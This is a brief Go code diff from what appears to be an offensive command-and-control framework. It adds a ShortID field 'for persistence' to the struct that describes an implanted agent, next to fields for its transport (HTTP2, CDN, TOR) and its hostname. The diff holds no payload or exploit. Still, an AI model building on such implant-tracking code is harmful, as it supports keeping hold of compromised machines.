@@ -13,6 +13,7 @@ import (
 type Emp3r0rAgent struct {
 	Tag         string           `cbor:"1,keyasint"`  // identifier of the agent
 	Name        string           `cbor:"2,keyasint"`  // short name of the agent
+	ShortID     string           `cbor:"35,keyasint"` // short hash of UUID-UUIDSig for persistence
 	Version     string           `cbor:"3,keyasint"`  // agent version
 	Transport   string           `cbor:"4,keyasint"`  // transport the agent uses (HTTP2 / CDN / TOR)
 	Hostname    string           `cbor:"5,keyasint"`  // Hostname and machine ID
